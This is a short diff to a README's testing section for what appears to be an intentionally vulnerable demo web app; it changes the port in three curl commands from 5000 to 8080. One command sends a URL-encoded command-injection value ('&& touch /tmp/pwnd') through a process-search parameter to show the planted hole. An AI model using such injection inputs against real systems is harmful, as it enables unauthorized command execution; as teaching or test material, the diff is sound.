@@ -59,7 +59,7 @@ $ grep vulnerability . -R -n | grep -v README
 ### How to test
 
 ```
-$ curl -b cookie.txt -d'username=admin&password=admin' localhost:5000/login
-$ curl -c cookie.txt localhost:5000/grep_processes?name=kworker
-$ curl -c cookie.txt "localhost:5000/grep_processes?name=xxx%20%26%26%20touch%20%2Ftmp%2Fpwnd"
+$ curl -b cookie.txt -d'username=admin&password=admin' localhost:8080/login
+$ curl -c cookie.txt localhost:8080/grep_processes?name=kworker
+$ curl -c cookie.txt "localhost:8080/grep_processes?name=xxx%20%26%26%20touch%20%2Ftmp%2Fpwnd"
 ```
